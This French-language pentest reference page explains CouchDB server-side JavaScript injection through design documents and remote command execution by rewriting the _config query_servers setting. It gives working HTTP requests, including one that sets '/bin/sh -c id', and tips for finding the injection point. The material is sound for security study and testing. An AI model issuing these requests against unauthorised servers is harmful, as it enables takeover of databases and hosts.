---
title: "Injection JavaScript dans les documents de conception et query servers CouchDB"
description: "Écrire un document de conception ou atteindre les réglages _config query_servers exécute du JavaScript de l'attaquant dans le processus query server de CouchDB, atteignant l'exécution de code."
keywords:
  - injection JavaScript CouchDB
  - document de conception
  - query server
  - _config query_servers
  - exécution de code côté serveur
  - os_daemons
---

# Injection JavaScript

CouchDB exécute du JavaScript côté serveur. Chaque document de conception (`_design/*`) est un document JSON dont les champs contiennent des corps de fonction sous forme de chaînes, et CouchDB expédie ces chaînes à un processus **query server** distinct (SpiderMonkey, historiquement) qui les compile et les exécute. Tout chemin qui permet à un attaquant de placer du JavaScript dans un document de conception, ou de redéfinir quel interpréteur le query server utilise, exécute du code contrôlé par l'attaquant à l'intérieur du serveur.

## La surface du document de conception

Un document de conception est écrit avec un `PUT` ordinaire :

```http
PUT /app/_design/evil HTTP/1.1
Host: target:5984
Content-Type: application/json
Authorization: Basic ...

{
  "views": {
    "x": { "map": "function(doc){ emit(doc._id, doc); }" }
  },
  "shows": {
    "y": "function(doc, req){ return {body: JSON.stringify(doc)}; }"
  }
}
```

Les champs `map`, `reduce`, `shows`, `lists`, `updates`, `filters` et `validate_doc_update` sont tous du JavaScript exécuté par le query server. Une application qui relaie une entrée non fiable dans une écriture de document de conception, ou qui laisse un utilisateur à faibles privilèges créer des documents de conception, remet à l'attaquant une primitive d'exécution de code à l'intérieur du bac à sable du query server. Atteindre les documents dans ces champs est l'injection : le JavaScript s'exécute la prochaine fois que la vue correspondante est construite, que le show/list est rendu, ou que le gestionnaire update se déclenche.

## Déclencher l'exécution

Une fonction map s'exécute lorsque sa vue est interrogée, ce qui la construit aussi :

```http
GET /app/_design/evil/_view/x HTTP/1.1
```

Une fonction `show` s'exécute à la demande :

```http
GET /app/_design/evil/_show/y/somedocid HTTP/1.1
```

À l'intérieur de ces fonctions, l'attaquant contrôle du JavaScript arbitraire, y compris `JSON.stringify` sur des documents que la fonction ne toucherait normalement pas et des boucles qui parcourent chaque ligne émise.

## Atteindre la configuration du query server

La classe à plus fort impact cible l'API `_config`, spécifiquement la section `query_servers`, qui associe un nom de langage à la ligne de commande que CouchDB exécute pour démarrer cet interpréteur :

```http
GET /_node/_local/_config/query_servers HTTP/1.1
```

```http
PUT /_node/_local/_config/query_servers/cmd HTTP/1.1
Host: target:5984
Content-Type: application/json

"/bin/sh -c id"
```

Parce que la valeur est une ligne de commande que le serveur exécutera pour lancer un « langage », redéfinir ou ajouter une entrée de query server transforme une écriture de configuration en exécution de commande du système d'exploitation la prochaine fois qu'un document dans ce langage est traité. Les sections de configuration `os_daemons` connexes (et, dans certaines versions, `native_query_servers`) se comportent de façon similaire : une valeur écrite là est un processus que CouchDB engendre. Un document de conception peut alors déclarer `"language": "cmd"` pour forcer l'interpréteur planté à s'exécuter :

```http
PUT /app/_design/run HTTP/1.1

{ "language": "cmd", "views": { "z": { "map": "..." } } }
```

Interroger `/app/_design/run/_view/z` pousse CouchDB à invoquer la ligne de commande fournie par l'attaquant. CouchDB 2.x et les versions ultérieures ont remplacé l'ancien `/_config` de premier niveau par un `/_node/{name}/_config` par nœud ; `_local` se résout au nœud qui traite la requête, et un nom de nœud spécifique cible un autre nœud du cluster.

## Trouver le point d'injection

Sondez l'accès en écriture aux documents de conception et à `_config` : un `GET /_config` qui renvoie l'arbre de configuration, ou un `PUT /app/_design/test` qui réussit, confirme la primitive. Une application qui transmet des corps JSON dans les écritures CouchDB sans contraindre le préfixe de l'`_id` peut être orientée vers `_design/` en fournissant ce préfixe dans l'identifiant de document injecté.

## Outils

- **curl** : faire des PUT de documents de conception et atteindre l'API _config query_servers directement.
- **Burp Repeater** : forger les requêtes d'écriture de document de conception et de configuration.

## Références

- [Apache CouchDB: Design documents](https://docs.couchdb.org/en/stable/ddocs/ddocs.html)
- [Apache CouchDB: Query server protocol](https://docs.couchdb.org/en/stable/query-server/protocol.html)
- [Apache CouchDB: Configuration API](https://docs.couchdb.org/en/stable/api/server/configuration.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
